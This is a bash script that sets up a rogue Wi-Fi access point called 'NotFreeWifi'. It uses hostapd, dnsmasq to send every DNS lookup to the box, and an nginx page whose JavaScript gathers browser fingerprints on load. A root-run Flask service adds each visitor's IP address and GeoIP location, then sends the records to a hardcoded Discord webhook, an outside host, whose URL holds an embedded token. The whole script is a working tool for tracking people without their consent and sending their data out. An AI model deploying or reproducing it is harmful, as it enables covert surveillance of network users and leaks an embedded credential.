#!/bin/bash

# Ensure the script is run as root
if [ "$(id -u)" != "0" ]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi

# Update and install necessary packages
apt-get update
apt-get install -y hostapd dnsmasq nginx python3-flask python3-requests python3-geoip2

# Configure hostapd
cat > /etc/hostapd/hostapd.conf <<EOF
interface=wlan0
driver=nl80211
ssid=NotFreeWifi
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=12345678
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Update hostapd default file to use the new configuration
sed -i 's|^DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd

# Configure dnsmasq
cat > /etc/dnsmasq.conf <<EOF
log-facility=/var/log/dnsmasq.log
address=/#/10.0.0.1
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.250,12h
no-resolv
log-queries
EOF

# Configure network interfaces
cat > /etc/network/interfaces <<EOF
auto lo

iface lo inet loopback
iface eth0 inet dhcp

allow-hotplug wlan0
iface wlan0 inet static
address 10.0.0.1
netmask 255.255.255.0
broadcast 10.0.0.255
EOF

# Create a simple web page with JavaScript to collect fingerprint data
mkdir -p /usr/share/nginx/www
cat > /usr/share/nginx/www/index.html <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NotFreeWifi</title>
    <style>
        body {
            background-color: #0d0d0d;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        h1 {
            font-size: 3rem;
            animation: flicker 1.5s infinite alternate;
        }
        p {
            font-size: 1.5rem;
        }
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <h1>Welcome to NotFreeWifi!</h1>
    <p>Your connection has been logged and monitored.</p>
    <script>
        function getFingerprint() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: \`\${screen.width}x\${screen.height}\`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
        }

        async function sendFingerprint() {
            const fingerprint = getFingerprint();
            await fetch('/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(fingerprint)
            });
        }

        sendFingerprint();
    </script>
</body>
</html>
EOF

# Set up iptables rules
iptables -F
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j ACCEPT
iptables -A INPUT -p udp --dport 67:68 -j ACCEPT
iptables -A INPUT -j DROP
sh -c "iptables-save > /etc/iptables.rules"

# Enable services to start on boot
systemctl enable nginx
systemctl enable hostapd
systemctl enable dnsmasq

# Configure nginx to proxy requests to the Flask app
cat > /etc/nginx/sites-available/default <<EOF
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /usr/share/nginx/www;
    index index.html index.htm index.nginx-debian.html;

    server_name _;

    location / {
        try_files \$uri \$uri/ =404;
    }

    location /collect {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF

# Reload nginx to apply changes
systemctl reload nginx

# Create the Flask app to handle fingerprint collection
cat > /usr/local/bin/fingerprint_collector.py <<EOF
#!/usr/bin/env python3
from flask import Flask, request
import requests
import json
import geoip2.database

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1099806912956088412/iejfzOQx5u4EcV-Gba7Ki1zV_Y7ERIOTFM6HnQPXHPJ5kGbRPDYWjq3KcrEaTQXyEUze'

reader = geoip2.database.Reader('/usr/local/share/GeoIP/GeoLite2-City.mmdb')

def get_geoip_info(ip):
    try:
        response = reader.city(ip)
        return {
            'country': response.country.name,
            'city': response.city.name,
            'latitude': response.location.latitude,
            'longitude': response.location.longitude
        }
    except:
        return {}

@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    data['ip'] = request.remote_addr
    data['geoip'] = get_geoip_info(request.remote_addr)
    headers = {'Content-Type': 'application/json'}
    response = requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(data), headers=headers)
    return 'OK', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
EOF

# Make the Flask script executable
chmod +x /usr/local/bin/fingerprint_collector.py

# Create systemd service for the Flask app
cat > /etc/systemd/system/fingerprint_collector.service <<EOF
[Unit]
Description=Fingerprint Collector Service
After=network.target

[Service]
ExecStart=/usr/local/bin/fingerprint_collector.py
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the fingerprint collector service
systemctl enable fingerprint_collector.service
systemctl start fingerprint_collector.service

# Install GeoIP Database
wget https://geolite.maxmind.com/download/geoip/database/GeoLite2-City.tar.gz
tar -xvf GeoLite2-City.tar.gz
mkdir -p /usr/local/share/GeoIP
mv GeoLite2-City_*/GeoLite2-City.mmdb /usr/local/share/GeoIP/

# Reboot the system to apply changes
reboot
